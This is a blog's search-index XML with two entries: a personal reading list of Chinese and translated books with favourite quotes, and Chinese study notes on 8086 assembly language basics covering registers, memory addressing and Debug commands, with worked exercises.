<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2025-计划书单</title>
    <url>/2024/01/23/2025-%E8%AE%A1%E5%88%92%E4%B9%A6%E5%8D%95/</url>
    <content><![CDATA[<h2 id="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"><a href="#预祝新的一年你会有更多的属于自己的时刻！❀❀❀" class="headerlink" title="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"></a>预祝新的一年你会有更多的属于自己的时刻！❀❀❀</h2><h2 id="2025"><a href="#2025" class="headerlink" title="2025"></a>2025</h2><h3 id="《我的阿勒泰》-李娟"><a href="#《我的阿勒泰》-李娟" class="headerlink" title="《我的阿勒泰》- 李娟"></a><strong>《我的阿勒泰》- 李娟</strong></h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/31/cpplatform_fy7wyg2acrhxq1vu4yvs9y/t6_cpplatform_fy7wyg2acrhxq1vu4yvs9y1714307419.jpg" style="zoom:67%;">

<ul>
<li><input disabled type="checkbox"> looking forward to </li>
<li><input checked disabled type="checkbox"> reading </li>
<li><input disabled type="checkbox"> over</li>
</ul>

  <div class="note-large orange">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li><p>灯光很暗，所有的眼睛都很亮。</p>
</li>
<li><p>于是再冬天最冷的漫长日子里，没有一行脚印能通向我的家。</p>
</li>
<li><p>于是我始终没有离开那个家的牵绊，我的文字也始终纠缠在那样的生活之中，怎么写都意犹未尽，欲罢不能。</p>
</li>
<li><p>这大地辽阔，看似四通八达，其实步步都有可能通向永远也回不到上一步的地方。</p>
</li>
<li><p>如今我们所得到的一切，全都是理所当然的吗？</p>
</li>
<li><p>我们都是喜欢散步的。</p>
</li>
<li><p>每当抬头看到着太阳，都好像时有生以来第一次看到一样——心里微微一动，惊奇感转瞬即逝，但记起现实后的那种猛然而至的空洞感却难以愈合。</p>
</li>
</ul>

    </div>
  </div>



<hr>
<h2 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h2><a class="button " title="总结">总结</a>一年时光匆匆过去，阅读瞬间有开心，有难过，有悲伤，有喜悦，跨越时间和空间，沉进去，仿佛自己就是其中人物。

<h3 id="《家山》-王跃文"><a href="#《家山》-王跃文" class="headerlink" title="《家山》-王跃文"></a>《家山》-王跃文</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/93/cpplatform_wasbfpsxrwvmnyuxlq1cng/t6_cpplatform_wasbfpsxrwvmnyuxlq1cng1676432256.jpg" alt="家山" style="zoom:67%;">

<ul>
<li><input disabled type="checkbox"> looking forward to </li>
<li><input disabled type="checkbox"> reading </li>
<li><input checked disabled type="checkbox"> over</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>每一个人心中都会有一座属于自己的家山。</li>
<li>东边齐天界不远不近，隔着万溪江，山重着山，起起落落，没入云天。南边的山越远越高，万溪江是从南边山里流下来的。北边的山在更远的地方，人在沙湾只望得见远村的树。</li>
</ul>

    </div>
  </div>



<h3 id="《且听风吟》-村上春树"><a href="#《且听风吟》-村上春树" class="headerlink" title="《且听风吟》-村上春树"></a>《且听风吟》-村上春树</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/49/cpplatform_oce6dn71cnfvjp2yfeqp58/t6_cpplatform_oce6dn71cnfvjp2yfeqp581686221038.jpg" alt="且听风吟" style="zoom:67%;">

<ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input checked disabled type="checkbox"> over</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>这世间，中有一个人懂你，让你抿起嘴，想念时流下眼泪。那些曾以为走不出的日子，现在都回不去了。</li>
</ul>

    </div>
  </div>

<h3 id="《1973年的弹子球》-村上春树"><a href="#《1973年的弹子球》-村上春树" class="headerlink" title="《1973年的弹子球》-村上春树"></a>《1973年的弹子球》-村上春树</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/36/cpplatform_aatj6agdwmbqvhurhtc1w4/t6_cpplatform_aatj6agdwmbqvhurhtc1w41686276723.jpg" alt="1973年的弹子球" style="zoom:67%;">

<ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>长大，或许就是终有一天你会知道，有些事物，当它从我们的生命中遗落时，就已经无法寻回。</li>
</ul>

    </div>
  </div>

<h3 id="《寻羊冒险记》-村上春树"><a href="#《寻羊冒险记》-村上春树" class="headerlink" title="《寻羊冒险记》-村上春树"></a>《寻羊冒险记》-村上春树</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/12/cpplatform_1kmjqthlpk6pwrnpzaqvod/t6_cpplatform_1kmjqthlpk6pwrnpzaqvod1686220978.jpg" alt="寻羊冒险记" style="zoom:67%;">

<ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>

  <div class="note-large black">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>我喜欢我的懦弱，痛苦和难堪也喜欢，喜欢夏天的光照，风的气息，蝉的鸣叫，我喜欢这些，喜欢的不得了。</li>
</ul>

    </div>
  </div>

<h3 id="《了不起的盖茨比》-弗朗西斯·司各特·菲茨杰拉德"><a href="#《了不起的盖茨比》-弗朗西斯·司各特·菲茨杰拉德" class="headerlink" title="《了不起的盖茨比》-弗朗西斯·司各特·菲茨杰拉德"></a>《了不起的盖茨比》-弗朗西斯·司各特·菲茨杰拉德</h3><img lazyload src="/images/loading.svg" data-src="https://wfqqreader-1252317822.image.myqcloud.com/cover/211/216211/t6_216211.jpg" alt="了不起的盖茨比" style="zoom:67%;">

<ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>

  <div class="note-large brown">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>这个世界，并不是所有人，都拥有你的那些优势。</li>
</ul>

    </div>
  </div>

<h3 id="《蛤蟆先生看心理医生》-罗伯特·戴博德"><a href="#《蛤蟆先生看心理医生》-罗伯特·戴博德" class="headerlink" title="《蛤蟆先生看心理医生》-罗伯特·戴博德"></a>《蛤蟆先生看心理医生》-罗伯特·戴博德</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/81/YueWen_35551088/t6_YueWen_35551088.jpg" alt="蛤蟆先生看心里医生" style="zoom:67%;">

<ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input checked disabled type="checkbox"> over</li>
</ul>

  <div class="note-large green">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>能帮助你的人，只有你自己的。请相信，你可以完成这一切的，你并不是自以为的那样弱小。</li>
</ul>

    </div>
  </div>

<h3 id="《The-Wind-in-the-Willows》《柳林风声》"><a href="#《The-Wind-in-the-Willows》《柳林风声》" class="headerlink" title="《The Wind in the Willows》《柳林风声》"></a>《The Wind in the Willows》《柳林风声》</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/64/YueWen_32005703/t6_YueWen_32005703.jpg" alt="柳林风声" style="zoom:67%;">

<ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>

  <div class="note-large green">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>关于四个小动物之间的友情陪伴和共同冒险的人生故事，蛤蟆先生的原型。</li>
</ul>

    </div>
  </div>

<h3 id="《我想成为不错的人，但这并不容易》-韩-洪和延-黄艳涛-译"><a href="#《我想成为不错的人，但这并不容易》-韩-洪和延-黄艳涛-译" class="headerlink" title="《我想成为不错的人，但这并不容易》-[韩]洪和延&#x2F;黄艳涛 译"></a>《我想成为不错的人，但这并不容易》-[韩]洪和延&#x2F;黄艳涛 译</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/62/cpplatform_dz5p42v9z9g4hnehgv1frj/t6_cpplatform_dz5p42v9z9g4hnehgv1frj1721800954.jpg" alt="我想成为不错的人，但这并不容易" style="zoom:67%;">

<ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input checked disabled type="checkbox"> over</li>
</ul>

  <div class="note-large yellow">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>我为什么会认为，不努力的人生是失望，糟糕透顶的呢？即使是不做任何努力的我，也值得被喜欢。</li>
<li>我能成为不错的人吗？</li>
<li>我何时才能成为一个性格爽朗、会展现温暖笑容的人？不论开心还是悲伤，都能轻松地用几行文字或话语表达出来，我会成为那样的人吗？</li>
<li>如果你感到难受，那就难受，没必要看别人的眼色。</li>
<li>即使无事可做，也要保证每周外出一趟。</li>
<li>做自己喜欢做的事情，好好生活才是令人向往的。</li>
</ul>

    </div>
  </div>

<h3 id="《你也走了很远的路吧》-卢思浩"><a href="#《你也走了很远的路吧》-卢思浩" class="headerlink" title="《你也走了很远的路吧》-卢思浩"></a>《你也走了很远的路吧》-卢思浩</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/77/cpPlatform_dxft6QPJSm3ZvLVYWfPmAj/t6_cpPlatform_dxft6QPJSm3ZvLVYWfPmAj.jpg" alt="你也走了很远的路吧" style="zoom:67%;">

<ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input checked disabled type="checkbox"> over</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>你要变成自己想象中的样子，这件事，一步都不能让。</li>
<li>我张开了手，却只能抱住风。</li>
<li>后来走廊被黄昏染色，冬天被大雪唤醒，思念被歌曲收藏，却找不到分享的人。告别就是看到所有美好的东西，也不再和你说了。</li>
<li>我选择相信这个世界上美好的存在——五月吹来的微风，盛夏飘过的小雨，深夜耳机的音乐，午后慵懒的阳光。希望你也是。</li>
<li>不要让他们失望，最重要的是不要让自己失望。</li>
<li>在一起，意味着我从今以后的人生，愿意分你一半。这句话，不只是陪伴，还包含着信任。</li>
<li>不是说不想去分享，而是原来这样的日出不用分享，也值得看。</li>
<li>有些事情大可一个人做。只是我们缺少一个人做的勇气。</li>
<li>如果你知道你等的永远不会来，那你会学会死心 的。至于偶尔冒上头的想念，就想念吧。</li>
<li>我学会自我消化了。喜欢的东西不再非要别人认同了，难过的事情也不再非要告诉谁谁谁了，情绪自我消化，就算很难调节过来，我也不再抗拒了。</li>
</ul>

    </div>
  </div>

<h3 id="《漫长的旅途》-卢思浩"><a href="#《漫长的旅途》-卢思浩" class="headerlink" title="《漫长的旅途》-卢思浩"></a>《漫长的旅途》-卢思浩</h3><img lazyload src="/images/loading.svg" data-src="https://cdn.weread.qq.com/weread/cover/49/cpplatform_wvf4mnobdepujf6bnatk2c/t6_cpplatform_wvf4mnobdepujf6bnatk2c1695804309.jpg" alt="漫长的旅途" style="zoom:67%;">

<ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input checked disabled type="checkbox"> over</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>LIKE💖</p>

    </div>
    <div class="notel-content">
      <ul>
<li>读书到底有什么用。我都是这么回答的，读书能填上心里的洞，我的心破了好几次。</li>
<li>小说大多是虚构的，但故事的魅力从来不在于是否虚构，而在于能不能打动你的心。只要能打动你，那你能感受到的力量就是真的，那人物就真的在另一个平行时空活着，那些故事会在你的心里扎根。</li>
<li>从一开始，我们都不用变成烟火，也应该被看到。</li>
<li>我突然意识到，我回忆里的大多人大多事，都像这只萤火虫。</li>
<li>当我不再执著着复现往事时，往事才因此成了永恒。</li>
<li>这个世界有时候确实很糟糕，但还有美好的东西存在，值得我再往前走一走。</li>
<li>所谓朋友，不是跟你日常最靠近的人，而是能发自内心尊重你的人。</li>
</ul>

    </div>
  </div>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>2025</tag>
        <tag>书单</tag>
        <tag>Love</tag>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>Assembley_language</title>
    <url>/2024/06/09/Assembley-language/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="1-第一章基础知识"><a href="#1-第一章基础知识" class="headerlink" title="1.第一章基础知识"></a>1.第一章基础知识</h1><h2 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1.机器语言"></a>1.1.机器语言</h2><p>机器语言就是机器指令的集合，机器指令展开来讲就是一台机器可以正确执行的命令</p>
<h2 id="1-2-汇编语言的产生"><a href="#1-2-汇编语言的产生" class="headerlink" title="1.2.汇编语言的产生"></a>1.2.汇编语言的产生</h2><p>汇编指令和机器指令的差别在于指令的表示方法上，汇编指令是机器指令便于记忆的书写格式</p>
<blockquote>
<p>操作 ：寄存器BX内容送到AX中</p>
<p>机器指令：1000100111011000</p>
<p>汇编指令：mov ax，bx</p>
</blockquote>
<p>因为计算机只能读懂机器指令，需要使用编译器将汇编指令编译成机器指令</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/a1.png" alt="a1"></p>
<h2 id="1-3-存储器"><a href="#1-3-存储器" class="headerlink" title="1.3.存储器"></a>1.3.存储器</h2><p>就是我们平常所说的内存</p>
<h2 id="1-4-存储单元"><a href="#1-4-存储单元" class="headerlink" title="1.4.存储单元"></a>1.4.存储单元</h2><p>存储器会被划分若干个存储单元</p>
<h2 id="1-5-CPU对存储器的读写"><a href="#1-5-CPU对存储器的读写" class="headerlink" title="1.5.CPU对存储器的读写"></a>1.5.CPU对存储器的读写</h2><p>通过地址总线，数据总线，控制总线对存储芯片中的数据进行读写</p>
<h2 id="1-6-主板"><a href="#1-6-主板" class="headerlink" title="1.6.主板"></a>1.6.主板</h2><p>每一台PC中，都有一个主板，通过地址总线，数据总线，控制总线将核心器件和主要器件进行相连</p>
<h2 id="1-7-接口卡"><a href="#1-7-接口卡" class="headerlink" title="1.7.接口卡"></a>1.7.接口卡</h2><p>计算机系统中，所有可用程序控制其工作的设备，必须收到CPU控制，CPU对外部设备都不能直接控制，比如显示器，音响，打印机等，直接控制这些设备进行工作的是<code>插在扩展插槽上的接口卡</code>，扩展插槽通过总线和CPU相连，接口卡也通过总线和CPU进行相连。<strong>CPU通过总线向接口卡发送命令，接口卡根据CPU的命令控制外设进行工作</strong></p>
<h2 id="1-8-各类存储器芯片"><a href="#1-8-各类存储器芯片" class="headerlink" title="1.8.各类存储器芯片"></a>1.8.各类存储器芯片</h2><p>一个PC中装有多个存储器芯片，从读写属性中分为</p>
<ul>
<li>RAM（随机存储器）：必须带电存储，关机后存储的内容丢失<ul>
<li>第一种:存放CPU和绝大部分程序和数据，主随机存储器一般由两个位置上的RAM组成，装在主板上的RAM和装在扩展槽上的RAM</li>
<li>第二种：接口卡上的RAM：某些接口需要对大批量数据，数据数据进行暂时存储，在其上安装RAM，最典型的就是显卡上的RAM，称之为<strong>显存</strong>，将要写入的内容写入显存中，显示卡随时将显存的数据在显示器上输出</li>
</ul>
</li>
<li>ROM（只读存储器）：只能读取，不能写入，关机之后内容不丢失<ul>
<li>装有BIOS（Basic Input&#x2F;Output System，基本输入&#x2F;输出系统）的ROM，BIOS 是主板和各类接口卡（如显卡，网卡等）厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入和输出。例如：主板的ROM中存储的主板的BIOS（系统BIOS），显卡上存储着显卡的BIOS，网卡上安装网卡的BIOS</li>
</ul>
</li>
</ul>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/a2.png" alt="a2"></p>
<h2 id="1-9-内存地址空间"><a href="#1-9-内存地址空间" class="headerlink" title="1.9.内存地址空间"></a>1.9.内存地址空间</h2><p>上述的那些存储器，在物理上是独立的器件，但是一些两点比较相同</p>
<ul>
<li>都和CPU总线进行相连</li>
<li>CPU对它进行读写时候都是通过控制线发出内存读写命令</li>
</ul>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1602839784794.png" alt="1602839784794"></p>
<p>在上图中，所有的物理存储器被看作一个有若干个存储单元组成的<code>逻辑存储器</code>，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间，CPU在在这段地址空间读写数据，实际上就是在相对应的物理存储器上读写数据</p>
<h2 id="1-10-总结"><a href="#1-10-总结" class="headerlink" title="1.10.总结"></a>1.10.总结</h2><blockquote>
<p><strong>总结：</strong></p>
<ol>
<li>汇编指令是机器指令的助记符，同机器指令一一对应</li>
<li>每一种CPU都有自己的汇编指令集</li>
<li>CPU可以直接使用的信息在存储器中存放</li>
<li>在存储器中指令和数据没有任何区别，都是二进制信息</li>
<li>存储单元从零开始顺序编号</li>
<li>一个存储单元可以存储8个bit，即8位二进制数</li>
<li>1Byte&#x3D;8bit 1KB&#x3D;1024B 1MB&#x3D;1024KB 1GB&#x3D;1024MB  <strong>类比：2^10 1KB 2^20 1MB 2^30 1GB</strong></li>
<li>每一个CPU芯片都有许多管脚，这些管脚和总线进行相连，也可以说，这些管脚引出总线。CPU引出3种总线的宽度标志这个CPU的不同方面的性能</li>
<li>地址总线宽度决定了CPU的寻址能力</li>
<li>数据总线的宽度决定了CPU和其它器件进行数据传送时的一次数据传送量</li>
<li>控制总线宽度决定了CPU对系统中器件的控制能力</li>
<li>内存地址空间：使用汇编语言编程时候，必须从CPU的角度考虑问题，对CPU来说，系统中的所有存储器中的存储单元都处于一个统一的逻辑存储器中，它的容量受CPU的寻址能力限制，这个逻辑CPU就是我们所说的内存地址空间</li>
</ol>
</blockquote>
<p><strong>习题：</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%B1%87%E7%BC%96%E6%A3%80%E6%B5%8B1.1.png" alt="汇编检测1.1"></p>
<p><u>（1）1个CPU的寻址能力为8KB，那么它的地址总线的宽度为 <strong>13</strong>位。</u></p>
<p>答：8 KB&#x3D;8*1024 Byte&#x3D;2^3^*2^10^&#x3D;2^13^ Byte 所以13位</p>
<p><u>（2）1KB的存储器有 <strong>1024</strong> 个存储单元，存储单元的编号从 <strong>0</strong> 到 <strong>1023</strong> 。</u></p>
<p>答：一个存储字长为8 bit，1 KB&#x3D;1024 Byte&#x3D;1024 * 8 bit 有1024 存储单元</p>
<p>（3）1KB的存储器可以存储 <u><strong>8192（2^13）</strong></u> 个bit， <u><strong>1024</strong></u>个Byte。</p>
<p>答：1 KB&#x3D;1024 Byte&#x3D;1024 * 8 bit </p>
<p>（4）1GB是 <u><strong>1073741824 （2^30）</strong></u> 个Byte、1MB是 <strong><u>1048576（2^20）</u></strong> 个Byte、1KB是 **<u>1024（2^10）</u>**个Byte。</p>
<p>（5）8080、8088、80296、80386的地址总线宽度分别为16根、20根、24根、32根，则它们的寻址能力分别为: <u><strong>64</strong> （KB）</u>、 <u><strong>1</strong> （MB）</u>、 <u><strong>16</strong> （MB）</u>、 <u><strong>4</strong> （GB）</u>。</p>
<p>答：16根：2^16&#x3D;2^10 * 2^6  2^10是1024就是1KB   然后乘2^6 &#x3D;64 就是64KB，后面一次类推 </p>
<p>（6）8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根。则它们一次可以传送的数据为: <u><strong>1</strong> （B）</u>、 <u><strong>1</strong> （B）</u>、 <u><strong>2</strong> （B）</u>、 <u><strong>2</strong> （B）</u>、 <u><strong>4</strong> （B）</u>。</p>
<p>答：8根就是8bit&#x3D;1B ，后面一次类推</p>
<p>（7）从内存中读取1024字节的数据，8086至少要读 <u><strong>512</strong></u> 次，80386至少要读 <u><strong>256</strong></u> 次。</p>
<p>答：8086 数据总线宽度为16 1024 * 8 &#x2F;16 &#x3D; 512  80386数据总线宽度为32 1024 * 8 &#x2F;32 &#x3D; 256</p>
<p>（8）在存储器中，数据和程序以 <u><strong>二进制</strong></u> 形式存放。</p>
<h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h1><blockquote>
<p>一个CPU由运算器，控制器，寄存器等器件构成，这些器件靠内部总线进行相连。简单的说CPU中：</p>
<ul>
<li>运算器进行信息处理</li>
<li>寄存器进行信息存储</li>
<li>控制器控制各种器件进行工作</li>
<li>内部总线连接各个器件，在他们之间进行各种数据的传送</li>
</ul>
<p>寄存器是CPU中程序员可以用指令读写的部件，程序员可以通过改变各种寄存器的内容实现对CPU的控制</p>
<p>8086CPU由14个寄存器：AX，BX，CX，DX，SI，DI，SP，BP，IP，CS，SS,DS,ES,PSW</p>
</blockquote>
<h2 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1.通用寄存器"></a>2.1.通用寄存器</h2><blockquote>
<p>所有的寄存器都是16位，可以存放两个字节。AX，BX，CX，DX 这4个通用寄存器，每一个寄存器可以分为两个可独立使用的8位寄存器来使用</p>
<ul>
<li>AX 可以分为AH和AL，累加器；可以与DX组合成为EAX&lt;&#x3D;&gt;DX:AX</li>
<li>CX可以分为CH和CL，计数器</li>
<li>DX可以分为DH和DL，累加器扩展</li>
<li>BX可以分为BH和BL，基址;可以和CX组合成为EBX&lt;&#x3D;&gt;CX:BX</li>
<li>BP基指针</li>
<li>SI源变址</li>
<li>DI目的变址</li>
<li>SP堆栈指针</li>
</ul>
</blockquote>
<h2 id="2-2-物理地址"><a href="#2-2-物理地址" class="headerlink" title="2.2.物理地址"></a>2.2.物理地址</h2><blockquote>
<p>CPU访问内存单元，要给出内存单元的地址。没一个内存单元在这个空间中都有一个唯一的地址，我们将这个唯一的地址称之为<code>物理地址</code></p>
</blockquote>
<h2 id="2-3-8086CPU给出物理地址的方法"><a href="#2-3-8086CPU给出物理地址的方法" class="headerlink" title="2.3.8086CPU给出物理地址的方法"></a>2.3.8086CPU给出物理地址的方法</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1603261636487.png" alt="1603261636487"></p>
<ol>
<li>CPU中的相关部件提供两个16位地址，一个称之为段地址，一个称之为偏移地址</li>
<li>段地址和偏移地址通过内部总线送入一个称之为地址加法器的部件</li>
<li>地址加法器将两个16位地址合成一个20位的物理地址</li>
<li>地址加法器通过内部总线将20位物理地址送入到输入和输出控制电路</li>
<li>输入和输出控制电路将20 位物理地址送上地址总线</li>
<li>20位物理地址被地址总线传送到存储器</li>
</ol>
<p><strong>地址加法器采用：</strong></p>
<p><strong>物理地址&#x3D;段地址*16+偏移地址</strong>[这里的16是十进制]</p>
<p><strong>物理地址&#x3D;段地址*(10)H+偏移地址</strong>[这里的10是十六进制]</p>
<h2 id="2-4-段的概念"><a href="#2-4-段的概念" class="headerlink" title="2.4.段的概念"></a>2.4.段的概念</h2><p>在编程时可以根据需要，将若干地址连续的内存单元看作一个段。偏移地址位16位，16位地址的最大寻址能力位64KB，所以要给段的长度最大位64KB</p>
<h2 id="2-5-段寄存器"><a href="#2-5-段寄存器" class="headerlink" title="2.5.段寄存器"></a>2.5.段寄存器</h2><blockquote>
<p>段寄存器：CS、DS、SS、ES</p>
<p>CS:<strong>代码段寄存器</strong></p>
<p>DS:<strong>数据段寄存器</strong></p>
<p>ES:<strong>附加段寄存器</strong></p>
<p>SS:<strong>堆栈段寄存器</strong></p>
<p>IP：<strong>指令指针寄存器</strong></p>
</blockquote>
<h2 id="2-6-CS和IP"><a href="#2-6-CS和IP" class="headerlink" title="2.6.CS和IP"></a>2.6.CS和IP</h2><p>假设CS中的内容位M，IP中内容位N，8086CPU将从内存M✖16+N单元开始，读取一条指令并执行</p>
<blockquote>
<p><strong>CPU将CS：IP指向内存单元中的内容看作指令</strong></p>
</blockquote>
<h2 id="2-7-总结"><a href="#2-7-总结" class="headerlink" title="2.7.总结"></a>2.7.总结</h2><blockquote>
<ul>
<li>CS 存放指令的段地址，IP存放指令的偏移地址，任意时刻，CPU将CS:IP指向内容当作指令的执行</li>
<li>CPU工作的流程</li>
<li>从CS：IP指向内存单元读取指令，读取的指令进入指令的缓冲器</li>
<li>IP指向下一条指令</li>
<li>执行指令</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1603262922153.png" alt="1603262922153"></p>
<h2 id="2-8-Debug"><a href="#2-8-Debug" class="headerlink" title="2.8.Debug"></a>2.8.Debug</h2><ul>
<li>R命令查看、改变CPU寄存器的内容</li>
<li>D命令查看内存中的内容</li>
<li>E命令改写内存中的内容</li>
<li>U命令将内存中的机器指令翻译成汇编指令</li>
<li>T命令执行一条机器指令s</li>
<li>A命令已汇编指令的格式在内存中写入一条机器指令</li>
</ul>
<blockquote>
<p>DEBUG调试命令中的标志表示</p>
<table>
<thead>
<tr>
<th align="center">标志</th>
<th align="left">名称</th>
<th align="left">标志为1</th>
<th align="left">标志为0</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">OF</td>
<td align="left">溢出标志(Overflow flag)</td>
<td align="left">OF&#x3D;1|是(OV)</td>
<td align="left">否(NV)</td>
<td>运算结果超出机器用补码所能表示的范围，则为溢出</td>
</tr>
<tr>
<td align="center">DF</td>
<td align="left">方向标志(Direction flag)</td>
<td align="left">DF&#x3D;1|递减(DN)</td>
<td align="left">递增(UP)</td>
<td>DF为串操作指定规定增减方向</td>
</tr>
<tr>
<td align="center">TF</td>
<td align="left">陷阱标志(Trap flag)</td>
<td align="left">TF&#x3D;1|产生中断</td>
<td align="left">未产生中断</td>
<td>TF供调试指令程序使用</td>
</tr>
<tr>
<td align="center">IF</td>
<td align="left">中断标志(Interrupt flag)</td>
<td align="left">IF&#x3D;1|允许(EI)</td>
<td align="left">关闭(DI)</td>
<td>可用开中断指令STI和关中断指令CLI设置IF的状态</td>
</tr>
<tr>
<td align="center">SF</td>
<td align="left">符号标志(Sign flag)</td>
<td align="left">SF&#x3D;1|负(NG)</td>
<td align="left">正(PL)</td>
<td>运算结果的正负</td>
</tr>
<tr>
<td align="center">ZF</td>
<td align="left">零标志(Zero flag)</td>
<td align="left">ZF&#x3D;1|是(ZR)</td>
<td align="left">否(NZ)</td>
<td>运算结果全为0则ZF置1，否则置0</td>
</tr>
<tr>
<td align="center">AF</td>
<td align="left">辅助进位标志(Auxiliary carry flag)</td>
<td align="left">AF&#x3D;1|有(AC)</td>
<td align="left">无(NA)</td>
<td>进行算数运算时，低半字节向高半字节产生进位(加法)或借位(减法)则AF&#x3D;1，否则为0</td>
</tr>
<tr>
<td align="center">PF</td>
<td align="left">奇偶标志(Parity flag)</td>
<td align="left">PF&#x3D;1|偶(PE)</td>
<td align="left">奇(PO)</td>
<td>操作结果中低八位中含1的个数的奇偶性，对应1的个数为偶数则PF&#x3D;1；</td>
</tr>
<tr>
<td align="center">CF</td>
<td align="left">进位标志(Carry flag)</td>
<td align="left">CF&#x3D;1|是(CY)</td>
<td align="left">否(NC)</td>
<td>算数运算时，最高位产生进位或借位，则CF&#x3D;1</td>
</tr>
</tbody></table>
</blockquote>
<h1 id="3-寄存器-内存访问"><a href="#3-寄存器-内存访问" class="headerlink" title="3.寄存器(内存访问)"></a>3.寄存器(内存访问)</h1><h2 id="3-1-内存中的字存储"><a href="#3-1-内存中的字存储" class="headerlink" title="3.1.内存中的字存储"></a>3.1.内存中的字存储</h2><p>CPU中用16位寄存器存储一个字，高8位存放高位字节，低8位存放低位字节。<strong>内存单元是字节单元，一个单元存放一个字节，一个字需要使用两个连续的内存单元进行存放</strong>，这个字的低位字节存放在低地址单元，高位字节存放在高地址单元。<strong>双字需要使用四个连续的内存单元进行存放</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1603853188787.png" alt="1603853188787"></p>
<p><strong>问题：</strong></p>
<ol>
<li>0地址单元存放的<u>字节型</u>数据是多少？<strong>20 H</strong></li>
<li>0地址单元存放的<u>字型</u>数据是多少？<strong>4E20 H</strong></li>
<li>2地址单元存放的<u>字节型</u>数据是多少？<strong>12 H</strong></li>
<li>2地址单元存放的<u>字型</u>数是多少？<strong>0012 H</strong></li>
<li>1地址单元存放的<u>字型</u>数据是多少？<strong>124E H</strong></li>
<li>0地址单元存放的<u>双字型</u>数据是多少？<strong>00124E20 H</strong></li>
</ol>
